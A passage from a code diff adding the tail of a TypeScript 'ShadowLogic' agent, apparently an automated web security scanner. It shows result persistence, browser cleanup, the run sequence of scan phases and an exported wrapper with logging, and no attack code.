+          }
+        }
+      }
+    } catch (err) {
+      console.log(`[ShadowLogic:${this.scanId}] Database persistence error:`, err);
+    }
+
+    const summary = `[SUCCESS] Scan Complete - ${this.discoveredUrls.size} URLs discovered, ${this.scanResult.vulnerabilities.length} vulnerabilities found, ${this.scanResult.statistics.testsExecuted} tests executed`;
+    this.addThought("success", summary);
+    
+    // Emit success message to terminal
+    emitToScan?.(this.scanId, "shadowLogic:system", {
+      message: summary,
+      type: "success",
+    });
+  }
+
+  async cleanup(): Promise<void> {
+    // Flush any pending batched events
+    this.flushEventBatch();
+    
+    // Clear batch timer
+    if (this.eventBatchTimer) {
+      clearTimeout(this.eventBatchTimer);
+      this.eventBatchTimer = null;
+    }
+    
+    if (this.page) await this.page.close().catch(() => {});
+    if (this.context) await this.context.close().catch(() => {});
+    if (this.browser) await this.browser.close().catch(() => {});
+    
+    this.page = null;
+    this.context = null;
+    this.browser = null;
+  }
+
+  async run(): Promise<ShadowLogicScanResult> {
+    try {
+      await this.initialize();
+      
+      if (this.config.registrationUrl) {
+        await this.attemptRegistration();
+      }
+      
+      await this.mapBusinessFlows();
+      await this.runSecurityTests();
+      await this.generateReport();
+      
+      this.scanResult.completedAt = new Date().toISOString();
+      this.updatePhase("completed");
+      
+      return this.scanResult;
+    } catch (error) {
+      this.scanResult.error = error instanceof Error ? error.message : String(error);
+      this.scanResult.status = "error";
+      this.addThought("error", `Scan failed: ${this.scanResult.error}`);
+      throw error;
+    } finally {
+      await this.cleanup();
+    }
+  }
+
+  getResult(): ShadowLogicScanResult {
+    return this.scanResult;
+  }
+}
+
+export async function runShadowLogicScan(
+  config: ShadowLogicScanConfig,
+  userId: string,
+  scanId?: string,
+  onUpdate?: (thought: ShadowLogicThought) => void
+): Promise<ShadowLogicScanResult> {
+  console.log(`[ShadowLogic] RUN STARTED - scanId=${scanId}`);
+  try {
+    console.log(`[ShadowLogic] Loading socket functions...`);
+    await loadSocketFunctions();
+    console.log(`[ShadowLogic] Socket functions loaded`);
+  } catch (err) {
+    console.error(`[ShadowLogic] Socket load error:`, err);
+    throw err;
+  }
+  
+  const id = scanId || nanoid();
+  console.log(`[ShadowLogic] Creating agent with id=${id}`);
+  const agent = new ShadowLogicAgent(config, userId, id, onUpdate);
+  console.log(`[ShadowLogic] Agent created, calling run()`);
+  
+  try {
+    const result = await agent.run();
+    console.log(`[ShadowLogic] Agent.run() completed successfully`);
+    return result;
+  } catch (err) {
+    console.error(`[ShadowLogic] Agent.run() failed:`, err);
+    throw err;
+  }
+}
